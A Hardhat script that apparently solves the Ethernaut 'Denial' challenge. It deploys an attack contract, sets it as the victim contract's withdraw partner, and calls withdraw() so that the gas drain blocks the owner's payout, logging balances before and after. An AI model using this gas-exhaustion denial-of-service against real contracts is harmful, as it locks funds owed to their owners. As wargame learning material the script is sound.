const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("Denial");
  const victim = await Victim.attach(
    "0xc90a63fB706b6Bd615932075560fa8F7BaF9AA0e" // This is the contract address that you get from starting your instance
  );

  // Check balance of owner
  const provider = hre.ethers.provider;
  const owner = await victim.owner();
  const initialbalance = await provider.getBalance(owner); // we see that the contract has 0.001 Ether
  console.log("The balance of the owner is ", initialbalance.toString());

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("DenialAttack");

  // Deploy contract
  const contract = await MyContract.deploy();
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // Call the setWithdrawPartner by passing the recently contract address deployed
  const attack1 = await victim.setWithdrawPartner(contract.address);
  await attack1.wait(1);

  // Call the withdraw function to verify that it doesn't pass the call since it drains all the gas
  const attack2 = await victim.withdraw();
  await attack2.wait(1);

  // Verify that the balance of the owner remains the same
  const finalbalance = await provider.getBalance(owner); // we see that the contract has 0.001 Ether
  console.log("The balance of the owner is ", finalbalance.toString());
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
